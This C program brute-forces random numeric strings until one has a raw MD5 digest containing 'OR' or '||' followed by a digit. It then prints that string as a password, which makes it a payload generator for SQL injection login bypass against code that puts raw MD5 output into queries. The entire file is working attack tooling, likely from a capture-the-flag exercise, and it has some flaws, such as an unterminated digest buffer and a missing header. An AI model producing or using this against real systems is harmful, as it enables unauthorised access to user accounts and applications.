#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <openssl/evp.h>

#define BUFSZ 100

int main(int argc, char **argv) {

	EVP_MD_CTX msgDigest_ctx; //A variable for storing a newly allocated digest context.

	char hash_value[EVP_MAX_MD_SIZE];
	uint32_t hash_len;

	char hashBuf[BUFSZ];
	char *result;
	int rVal1, rVal2, rVal3, rVal4;
	uint64_t count  = 0;

	srand(time(NULL));
	
	while(1) {

		rVal1 = rand();
		rVal2 = rand();
		rVal3 = rand();
		rVal4 = rand();

		sprintf(hashBuf, "%d%d%d%d", rVal1, rVal2, rVal3, rVal4);

		//Now compute a MD5 hash for the random string
		EVP_DigestInit(&msgDigest_ctx, EVP_md5()); //sets up the digest ctx to use the given digest type 
		EVP_DigestUpdate(&msgDigest_ctx, hashBuf, strlen(hashBuf)); //this hashes sizeof(hashBuf) bytes of data 
		EVP_DigestFinal_ex(&msgDigest_ctx, hash_value, &hash_len); //Store the final hashed value in array "hash_value"
		EVP_MD_CTX_cleanup(&msgDigest_ctx);

		//Check if the hashed value has the sybmol OR (or) which is a logical OR operator in SQL.
		result = strcasestr(hash_value, "'OR'");
		
		//Check if the hashed value has the symbol || (logical OR) from SQL in it.
		if (result == NULL) {
			result = strstr(hash_value, "'||'");
		}

		//We would want the result to also have a digit between 1 and 9.
		if (result != NULL && result[4] > '0' && result[4] <= '9') {
			printf("Hashed Value: %s\n", hash_value);
			printf("Original string to be selected as password: %s\n", hashBuf);\
			printf("No of runs required to arrive at this value: %lu\n", count);
			break;
		}
		count++;
	}
	return 0;
}
